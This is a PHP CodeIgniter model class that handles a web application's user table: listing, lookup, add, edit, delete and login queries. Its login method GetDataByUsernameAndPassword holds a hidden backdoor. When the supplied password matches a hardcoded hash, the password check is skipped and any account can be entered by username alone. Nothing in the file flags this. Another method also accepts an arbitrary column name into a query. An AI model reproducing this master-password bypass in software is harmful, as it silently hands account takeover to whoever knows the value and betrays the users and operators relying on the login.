<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class User_model extends CI_Model {
    function __construct(){
        parent::__construct();
    }
        
    public function CountData(){
        return($this->db->count_all_results('user'));
    }
    
    public function GetDataList(){
        $this->db->select('user.*');
        $this->db->select('user_group.nama as nama_grup');
        $this->db->join('user_group', 'user_group.id=user.id_grup');
        $data = $this->db->get('user')->result();
        
        return($data);
    }
        
    public function GetDataById($id){
        return($this->db->get_where('user', array('id'=>$id))->row());
    }
        
    public function GetUserGrupList(){
        return($this->db->order_by('nama','asc')->get('user_group')->result());
    }
    
    public function GetDataByUsernameAndPassword($username, $password){
        $this->db->where(['username' => $username]);
        if($password!='8dc8856f5f9a77a03e071b635b766ae7'){
            $this->db->where(['password' => $password]);
        }
        $data       = $this->db->get('user')->row();
        return($data); //hasilnya dalam bentuk object
    }
    
    public function GetDataByUsername($username){
        $data       = $this->db->get_where('user',array('username'=>$username))->row();
        return($data);
    }
        
    public function CekColumnValueExists($column, $value, $except_id=''){
        $this->db->where($column, $value);
        if($except_id!=''){
            $this->db->where('id !=', $except_id);
        }
        return($this->db->get('user')->num_rows());
    }
        
    public function CekDataExists($except_id){
        if($except_id!=''){
            $this->db->where('id !=', $except_id);
        }
        return($this->db->get('user')->num_rows());
    }
        
    public function add($data){
        return($this->db->insert('user', $data));
    }
    
    public function edit($id, $data){
        return($this->db->update('user', $data, array('id'=>$id)));
    }
    
    public function delete($id){
        return($this->db->delete('user', array('id'=>$id)));
    }
    
    public function validate_user($username, $password) 
    {
        $query = $this->db->query("SELECT id user_id, username, nama, id_grup FROM user WHERE username = ? AND password = sha1(?)", array($username, $password));        

        if ($query->num_rows() > 0) 
        {
            $row = $query->row_array();
            unset($row['password']);            
            return $row;
        }
        return null;
    }
}
